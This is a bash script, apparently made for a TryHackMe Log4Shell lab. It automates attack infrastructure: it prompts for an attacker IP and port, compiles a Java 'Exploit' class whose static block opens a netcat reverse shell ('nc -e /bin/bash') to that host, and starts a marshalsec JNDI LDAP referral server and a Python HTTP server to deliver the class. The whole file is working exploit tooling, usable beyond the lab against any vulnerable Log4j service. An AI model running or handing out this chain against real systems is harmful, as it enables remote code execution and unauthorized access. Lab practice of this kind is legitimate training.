#!/bin/bash
#
# Setup THM LDAP Server
# Author: Juan Perez Jr

#######################################
# Print a message in a given color.
# Arguments:
#   Color. eg: green, red
#######################################
function print_color(){
  NC='\033[0m' # No Color

  case $1 in
    "green") COLOR='\033[0;32m' ;;
    "red") COLOR='\033[0;31m' ;;
    "*") COLOR='\033[0m' ;;
  esac

  echo -e "${COLOR} $2 ${NC}"
}

#######################################
# Read Attack Machine User Input
# Arguments:
#   Attacker IP Address. eg. 10.0.1.2, 192.0.1.2
#   Attacker Listener Port. eg: 9999, 8888
#######################################
function read_attack_machine () {
    read -p "Enter Attack Machine IP: " my_ip
    read -p "Enter Attack Machine NetCat Listener Port: " my_port
}

#######################################
# Builds the Exploit Java Binary
# Arguments:
#   Attacker IP Address. eg. 10.0.1.2, 192.0.1.2
#   Attacker Listener Port. eg: 9999, 8888
#######################################
function build_java_binary () {
    cd /root/solar/shell || exit
    print_color "green" "Writing Java binary..."
    echo "public class Exploit {
            static {
                try {
                    java.lang.Runtime.getRuntime().exec(\"nc -e /bin/bash ${my_ip} ${my_port}\");
                    } catch (Exception e) {
                        e.printStackTrace();
                        }
                }
            }" > Exploit.java
    javac Exploit.java
    print_color "green" "Java binary compiled successfully!"
}


#######################################
# Start LDAP Server
# Arguments:
#   Attacker IP Address. eg. 10.0.1.2, 192.0.1.2
#######################################
function start_ldap_server () {
    read_attack_machine
    build_java_binary
    print_color "green" "Starting LDAP Server..."
    java -cp /root/solar/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://$my_ip:8000/#Exploit" &
    LDAP_PID=$!
    print_color "green" "LDAP Server has started successfully!"
}

#######################################
# Start Python Simple HTTP Server
# Arguments:
#   None
#######################################
function start_python_server () {
    print_color "green" "Starting Python Simple HTTP Server..."
    cd /root/solar/shell || exit
    python3 -m http.server &
    PI_PID=$!
    print_color "green" "Python Simple HTTP Server has started successfully!"
}

#######################################
# Kills the LDAP Server Process
# Arguments:
#   None
#######################################
function kill_ldap_process () {
    print_color "red" "Killing LDAP Server..."
    kill $LDAP_PID
    print_color "red" "RIP LDAP!"
}

#######################################
# Kills the Python Server Process
# Arguments:
#   None
#######################################
function kill_python_process () {
    print_color "red" "Killing Python Server..."
    kill $PI_PID
    print_color "red" "RIP Python!"
}

while true
do
  echo "1. Start LDAP Server"
  echo "2. Start Simple HTTP Python Server"
  echo "3. Stop Servers"
  echo "4. Start Servers"
  echo "5. Quit and Exit container"

  sleep 1  
  read -rp "Enter your choice: " choice
  
  case $choice in
    
    1)  start_ldap_server;;
    
    2)  start_python_server ;;

    3)  kill_python_process
        kill_ldap_process ;;
    
    4)  start_ldap_server
        start_python_server ;;

    5)  kill_python_process
        kill_ldap_process
        print_color "red" "Thank you for hacking on my custom Docker container!"
        break ;;
  esac


done 